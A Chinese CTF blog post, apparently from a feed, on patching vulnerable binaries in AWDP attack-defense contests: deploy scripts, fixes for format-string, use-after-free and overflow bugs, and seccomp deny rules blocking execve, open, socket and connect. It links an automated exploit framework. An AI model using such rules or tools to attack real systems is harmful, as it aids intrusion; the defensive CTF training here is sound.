    <content type="html"><![CDATA[<h1 id="AWDP-FIX-及妙妙小工具"><a href="#AWDP-FIX-及妙妙小工具" class="headerlink" title="AWDP FIX 及妙妙小工具"></a>AWDP FIX 及妙妙小工具</h1><p>AWDP是<strong>一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式</strong>。 每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。 AWDP一般分为两个板块，Break（自己的payload打通）和Fix（让主办方的payload打不通）。</p><h2 id="AWDP-FIX"><a href="#AWDP-FIX" class="headerlink" title="AWDP FIX"></a>AWDP FIX</h2><p>参考了一大堆博客，来不及一一致敬了 0.0</p><h3 id="修补示例"><a href="#修补示例" class="headerlink" title="修补示例"></a>修补示例</h3><p>update.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">mv</span> pwn_fix /home/ctf/pwn</span><br><span class="line"><span class="built_in">chmod</span> 777 /home/ctf/pwn</span><br></pre></td></tr></table></figure><p>打包命令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcvf update.tar.gz update.sh pwn_fix</span><br></pre></td></tr></table></figure><h3 id="通用脚本"><a href="#通用脚本" class="headerlink" title="通用脚本"></a>通用脚本</h3><p>如果目标目录非<code>/home/ctf/</code>可以自行修改。</p><p>update.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp pwn /home/ctf/pwn</span><br><span class="line">chmod 777 /home/ctf/pwn</span><br></pre></td></tr></table></figure><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>避免格式化字符串的形式无非两种：一种是<code>&quot;%s&quot;, str</code>，一种是用其他输出函数来输出，例如说<code>puts</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(str);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">fputs</span>(str, <span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure><p>如果dyn中有puts，那是最方便的，直接从<code>printf(str)</code>执行成<code>puts(str)</code>，也就是将<code>call printf</code>修改为<code>call puts</code>。</p><p>如果dyn中没有puts，那么就需要尝试跳转出去在一个没有使用的可写段去写<code>printf(&quot;%s&quot;, str)</code>，我们跳转的位置是从上一个函数执行结束到当前格式化字符串漏洞的<code>call printf</code>，也就是原本参数修改到执行函数的位置都是自定义的，并不是只有<code>call printf</code>才能覆写。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511130837825.png" alt="image-20251113083718751"></p><h3 id="堆题的一些通用修复"><a href="#堆题的一些通用修复" class="headerlink" title="堆题的一些通用修复"></a>堆题的一些通用修复</h3><p>堆题高度依赖于 free 函数，如果说 malloc 等函数的不正确使用是造成漏洞的主要原因（比如说溢出就属于长度没控制好），那 free 就是触发漏洞的关键</p><p><strong>nop</strong> 掉free</p><p><strong>free后未置空</strong></p><p>一般来说后面有错误处理的话是最好的，一般checker不会管错误处理，所以直接在其他函数的错误处理上写<code>mov [rbp+ptr], 0</code>就可以了，例如说前面写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movrax, [rbp+ptr]</span><br><span class="line">movrdi, rax</span><br><span class="line">callfree</span><br></pre></td></tr></table></figure><p>那么<code>[rbp+ptr]</code>就是需要置空的地址，而非rdi或rax寄存器。所以<code>mov [rbp+ptr], 0</code>就是有效的。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>我们需要注意多种溢出方式，一种是输入溢出，一种是复制溢出。</p><p>输入溢出就是通过输入如<code>scanf(&quot;%s&quot;, buf)</code>、<code>read(0, buf, a_large_size)</code>等形式发生的；复制溢出就是通过<code>memcpy(buf1, buf2, a_large_size)</code>、<code>for i to a_large_size: buf1[i] = buf2[i]</code>等形式发生的。</p><p>memcpy、read这种函数本身存在控制字长的就很简单，可以先试试直接size_t传个0给不给过，然后再看缓冲区长度再去试。</p><p>用scanf的话大概率改三参数函数是不够的，一般还是要跳出去再回来，rdi rsi rdx。跳出去的话可以改为read，但其实还有方法，比如说从格式化字符串上下手，找个地方写<code>&quot;%12s&quot;</code></p><h2 id="妙妙小工具"><a href="#妙妙小工具" class="headerlink" title="妙妙小工具"></a>妙妙小工具</h2><h3 id="pwnpasi"><a href="#pwnpasi" class="headerlink" title="pwnpasi"></a>pwnpasi</h3><p><a href="https://github.com/heimao-box/pwnpasi">heimao-box&#x2F;pwnpasi：该工具是一个自动化的 PWN 利用框架，专为 CTF 竞赛和二进制漏洞利用而设计。它集成了堆栈溢出和格式字符串攻击等各种利用技术，支持 32 位和 64 位程序的自动分析和利用。</a></p><p><strong>签到题杀手</strong></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511122057608.png" alt="image-20251112205713536"></p><h3 id="evilPatcher"><a href="#evilPatcher" class="headerlink" title="evilPatcher"></a>evilPatcher</h3><p><a href="https://github.com/TTY-flag/evilPatcher">TTY-flag&#x2F;evilPatcher</a></p><p><a href="https://hello-ctf.com/hc-awd/awd_pwn.exp/#evilpatcher">【PWN】AWD 技巧 - Hello CTF</a></p><p>能给程序禁用一些系统调用来实现通防</p><blockquote><p> 这种方法对于 Docker 环境不适用，因为需要 Docker 开启 <strong>CAP_SYS_PTRACE</strong> 权限，但是这玩意会导致 Docker 逃逸，不过当然了，如果是纯黑盒的话，想逃还是很难的，360 等平台使用的似乎就是 Docker 的环境，而永信至诚的平台似乎是 VM 环境，这种方法可以使用</p></blockquote><p>sandbox里有几个规则</p><p><strong>mini_sandbox.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>阻止execve，允许除 execve 外的一切系统调用。</p><p>适合程序大多数功能都要保留，只是想简单防止被直接开 shell。</p><p><strong>sandbox1.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">A == open ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>阻止高位 syscall + execve+ open。</p><p>允许其它低号 syscalls（包括 read&#x2F;write&#x2F;socket 等）。</p><p>在防止 getshell 的基础上再禁止直接打开文件（<code>open</code>），提高读取本地敏感文件（如 <code>/flag</code>）的难度。</p><blockquote><p>很多程序正常运行可能需要 <code>open</code>（配置文件&#x2F;日志&#x2F;库加载），因此这个规则可能会破坏合法功能 —— 必须先测试并白名单必须的文件访问方式（或允许 <code>openat</code> 等）。</p></blockquote><p><strong>sandbox2.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == open ? dead : next</span><br><span class="line">A == mmap ? dead : next</span><br><span class="line">A == ptrace ? dead : next</span><br><span class="line">A == openat ? dead : next</span><br><span class="line">A == open_by_handle_at ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>阻止高位 syscall + <code>open</code>, <code>mmap</code>, <code>ptrace</code>, <code>openat</code>, open_by_handle_at。</p><p><strong>用途&#x2F;效果：</strong></p><ul><li>禁 <code>open</code>&#x2F;<code>openat</code>&#x2F;<code>open_by_handle_at</code>：禁止各种文件打开接口，防止读取文件（flag）。</li><li>禁 <code>mmap</code>：阻断常见的内存映射操作（有些 shellcode&#x2F;ROP 会用 <code>mmap</code> 映射可执行页或构造 RWX 段）；这会显著减少某类内存注入或动态映射攻击的成功率。</li><li>禁 <code>ptrace</code>：防止调试&#x2F;attach（阻止某些利用或调试行为）。</li></ul><blockquote><p>mmap 很常见（动态加载、malloc 实现可能内部用），有较大破坏性；使用前必须确认程序不依赖 <code>mmap</code>（或允许一小部分必要的 mmap 行为）。</p></blockquote><p><strong>sandbox3.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == socket ? dead : next</span><br><span class="line">A == connect ? dead : next</span><br><span class="line">A == bind ? dead : next</span><br><span class="line">A == listen ? dead : next</span><br><span class="line">A == clone ? dead : next</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>高位 syscall + <code>socket</code>, <code>connect</code>, <code>bind</code>, <code>listen</code>, <code>clone</code>, <code>execve</code>。</p><p>允许其它低号 syscalls (包括 <code>open</code>, <code>read</code>, <code>write</code>, <code>mmap</code> 等)。</p><p>禁止网络操作与进程克隆，适合把服务限定为仅能做本地工作、不能建立网络连接或fork线程</p><h2 id="最终启示-华为杯"><a href="#最终启示-华为杯" class="headerlink" title="最终启示 [华为杯]"></a>最终启示 [华为杯]</h2><p>啥工具都没招</p><p>快速修复启示就是</p><p>线下断网环境一定要拿个显卡部署个大模型30b以上的，都能秒</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AWDP-FIX-及妙妙小工具&quot;&gt;&lt;a href=&quot;#AWDP-FIX-及妙妙小工具&quot; class=&quot;headerlink&quot; title=&quot;AWDP FIX 及妙妙小工具&quot;&gt;&lt;/a&gt;AWDP FIX 及妙妙小工具&lt;/h1&gt;&lt;p&gt;AWDP是&lt;strong&gt;一种综合考</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
</feed>
